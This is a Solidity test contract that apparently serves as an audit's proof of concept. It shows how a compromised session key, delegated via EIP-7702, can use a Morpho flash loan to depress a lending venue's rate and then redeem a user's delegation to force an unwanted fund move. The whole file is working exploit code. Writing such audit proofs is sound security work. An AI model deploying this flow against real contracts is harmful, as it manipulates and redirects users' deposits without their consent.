// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMorphoFlash { function flashLoan(address token, uint256 assets, bytes calldata data) external; }
interface IAaveLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}
interface ICometLike {
    function supply(address asset, uint256 amount) external;
    function withdraw(address asset, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

/// Test only (the second AI audit's proof, test/yieldRouterAudit.test.js). The code a compromised session key puts on its own address with
/// EIP-7702, so that it is still "the redeemer" the delegation names while acting inside a flash loan:
/// borrow USDC for free, supply it to the venue the user is in (its rate collapses), redeem the user's
/// delegation for a router move that is now "to a better-paying venue", take the USDC back out, repay.
contract AuditFlashChurn {
    receive() external payable {}
    function churn(address morpho, address usdc, uint256 loan, uint8 kind, address venue, address dm, bytes calldata redeemCall) external {
        require(msg.sender == address(this), "session key only");
        IMorphoFlash(morpho).flashLoan(usdc, loan, abi.encode(usdc, kind, venue, dm, redeemCall));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        (address usdc, uint8 kind, address venue, address dm, bytes memory redeemCall) = abi.decode(data, (address, uint8, address, address, bytes));
        IERC20(usdc).approve(venue, assets);
        if (kind == 1) IAaveLike(venue).supply(usdc, assets, address(this), 0);
        else ICometLike(venue).supply(usdc, assets);
        (bool ok, bytes memory ret) = dm.call(redeemCall); // msg.sender is the session key's own address
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        if (kind == 1) IAaveLike(venue).withdraw(usdc, type(uint256).max, address(this));
        else ICometLike(venue).withdraw(usdc, ICometLike(venue).balanceOf(address(this)));
        IERC20(usdc).approve(msg.sender, assets);
    }
}
